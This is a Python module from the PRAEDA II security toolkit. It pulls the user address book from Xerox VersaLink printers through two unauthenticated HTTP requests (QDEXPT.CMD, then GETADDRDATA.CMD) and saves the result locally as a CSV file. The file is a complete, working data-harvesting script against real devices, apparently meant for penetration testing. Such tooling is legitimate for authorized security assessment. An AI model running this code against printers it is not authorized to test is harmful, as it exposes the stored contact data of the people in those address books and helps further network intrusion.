# Xerox retrieve the user address book 
######################################################
#                 PRAEDA II Module #MP0002           #
#                  Copyright (C) 2024                #
#              Deral 'percent_x' Heiland             #
######################################################
# this module will work on the following Xerox models
#      VersaLink C7020,C7025,C7130,B7030,B7125
#
#
#####################################################
import requests

def MP0002(TARGET, PORTS, web, OUTPUT, LOGFILE):
    # Set global variables
    count = 1

    # Open output file for logging
    try:
        with open(f'./{OUTPUT}/{LOGFILE}.log', 'a') as logFile:

# URL for the initial request
            url = f"http{web}://{TARGET}:{PORTS}/QDEXPT.CMD?DELIMITER=comma"

# Make the HTTP(s) request
            response = requests.get(url, verify=False)

# Check if the request was successful
            if response.status_code == 200:
    # Parse the JSON response
                data = response.json()

    # Extract the required fields
                file_name = data.get("fileName")
                spool_file = data.get("spoolFile")
                timer_id = data.get("timerID")

    # Verify that all fields are present
                if file_name and spool_file and timer_id:
                    print(f"Attemping to retreive Address book from Xerox MFP {TARGET}")
                else:
                    print("Error: Missing one or more required fields in the response from Xerox MFP.\n")
                    return
            else:
                print(f"Failed to fetch data. Status code: {response.status_code}")

# URL for sending the data back
            new_url = f"http{web}://{TARGET}:{PORTS}/GETADDRDATA.CMD?FILE={file_name}&SPOOLFILE={spool_file}&TIMERID={timer_id}"

# Make the second HTTP request
            new_response = requests.get(new_url, verify=False)

# Check if the request was successful
            if new_response.status_code == 200:
    # Save the CSV file to the file system
                with open(f'./{OUTPUT}/{TARGET}_{PORTS}_{file_name}', 'a') as file:
                    file.write(new_response.text)
                print(f"SUCCESS: Xerox Address book CSV file saved as {TARGET}_{PORTS}_{file_name}\n")
                logFile.write(f"SUCCESS: Xerox Address book CSV file saved :{TARGET}:{PORTS}::{TARGET}_{PORTS}_{file_name}\n")
            else:
                print(f"FAILED: to fetch CSV data. Status code: {new_response.status_code}\n")
                logFile.write(f"FAILED: Xerox Address book CSV file recovery failed :{TARGET}:{PORTS}::\n")
    except Exception as e:
        print(f"Failed to open output file {OUTPUT}\nError: {str(e)}")
